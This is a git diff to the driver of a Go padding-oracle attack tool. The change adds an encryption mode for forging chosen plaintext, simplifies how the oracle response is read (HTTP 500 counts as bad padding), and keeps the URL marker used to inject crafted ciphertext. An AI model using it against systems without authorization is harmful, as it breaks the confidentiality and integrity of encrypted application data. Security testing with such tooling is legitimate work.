@@ -8,7 +8,6 @@ import (
 
 	"encoding/hex"
 	"io/ioutil"
-	"regexp"
 	"strings"
 
 	"log"
@@ -45,11 +44,13 @@ func (t testpad) DecodeIV(IV string) []byte {
 	return t.DecodeCiphertextPayload(IV)
 }
 
-// CallOracle actually makes the HTTP/whatever request to the server that provides the padding oracle. Modify this to suit your application's needs.
-// Note the map[string][]byte gives you the opportunity to use whatever data from the response is available
-func (t testpad) CallOracle(encodedPayload string) map[string][]byte {
-	// Sample to be used with padex.py
+type Resp struct {
+	ResponseCode int
+	BodyData     string
+}
 
+// CallOracle actually makes the HTTP/whatever request to the server that provides the padding oracle and returns bool: true = padding was CORRECT/VALID; false = padding was INCORRECT/INVALID. Modify this to suit your application's needs.
+func (t testpad) CallOracle(encodedPayload string) bool {
 	if !strings.Contains(t.URL, "<PADME>") && !strings.Contains(t.Data, "<PADME>") {
 		panic("No marker supplied in URL or data")
 	}
@@ -61,16 +62,15 @@ func (t testpad) CallOracle(encodedPayload string) map[string][]byte {
 
 	bodyBytes, err := ioutil.ReadAll(resp.Body)
 	libpadoracle.Check(err)
-	retdata := map[string][]byte{"body": bodyBytes, "resp_code": []byte{byte(resp.StatusCode)}}
-	return retdata
+	return t.CheckResponse(Resp{ResponseCode: resp.StatusCode, BodyData: string(bodyBytes)})
 }
 
-// libpadoracle.CheckResponse tells the program whether the padding was invalid or not. Modify to suit the application's response when invalid padding is detected.
-func (t testpad) CheckResponse(resp map[string][]byte) bool {
-	// Sample - the server's response includes the string "Invalid Padding"
-	matched, err := regexp.MatchString(``, string(resp["body"]))
-	fmt.Println(matched, err)
-	if matched {
+// CheckResponse tells the program whether the padding was invalid or not. Modify to suit the application's response when invalid padding is detected.
+func (t testpad) CheckResponse(resp Resp) bool {
+	// Sample - the server's response includes the string "not padded correctly"
+	// matched, _ := regexp.MatchString(`not padded correctly`, resp.BodyData)
+	// fmt.Println(matched, err)
+	if resp.ResponseCode == 500 {
 		return false
 	}
 	return true
@@ -79,20 +79,23 @@ func (t testpad) CheckResponse(resp map[string][]byte) bool {
 func main() {
 	var cfg libpadoracle.Config
 	var cipherText string
+	var plainText string
 	var iv string
 	var url string
 	var method string
 	var data string
+
 	flag.StringVar(&cipherText, "c", "", "Provide the base ciphertext that you're trying to decipher (ripped straight from your request)")
+	flag.StringVar(&plainText, "p", "", "Provide the plaintext that you're trying to encrypt through exploitation of the padding oracle (for use with mode = 1)")
 	flag.StringVar(&iv, "iv", "", "Optional: provide the IV for Block 0 of your ciphertext (if the application has done Crypto bad, and treated the IV as secret)")
 	flag.IntVar(&cfg.BlockSize, "bs", 16, "Block size for the ciphertext. Common values are 8 (DES), 16 (AES)")
 	flag.IntVar(&cfg.Threads, "T", 100, "Number of threads to use for testing")
 	flag.IntVar(&cfg.Sleep, "S", 0, "Sleep x miliseconds between requests to be nice to the server")
 	flag.StringVar(&cfg.BlockRange, "blocks", "1,-1", "Optional: provide a range of blocks that are to be decrypted (useful for testing purposes). Note that the first value should always be '>=1'")
 	flag.StringVar(&url, "u", "", "The target URL. Use the marker '<PADME>' to identify the injection point (note: will libpadoracle.Check GET and POST data)")
-	flag.StringVar(&method, "m", "GET", "HTTP method to use (default GET)")
+	flag.StringVar(&method, "method", "GET", "HTTP method to use (default GET)")
 	flag.StringVar(&data, "data", "", "Optional: POST data to supply with request")
-
+	flag.IntVar(&cfg.Mode, "m", 0, "0 = Decrypt; 1 = Encrypt. Note: Encryption through a padding oracle cannot be concurrently performed (as far as I can determine). A single thread is used in this mode.")
 	flag.BoolVar(&cfg.Debug, "d", false, "Debug mode")
 
 	flag.Parse()
@@ -106,7 +109,7 @@ func main() {
 		}()
 	}
 	cfg.Pad = testpad{URL: url, Method: method, Data: data}
-
+	cfg.TargetPlaintext = []byte(plainText)
 	cfg.BaseCiphertext = cfg.Pad.DecodeCiphertextPayload(cipherText)
 	if iv != "" {
 		cfg.IV = cfg.Pad.DecodeIV(iv)
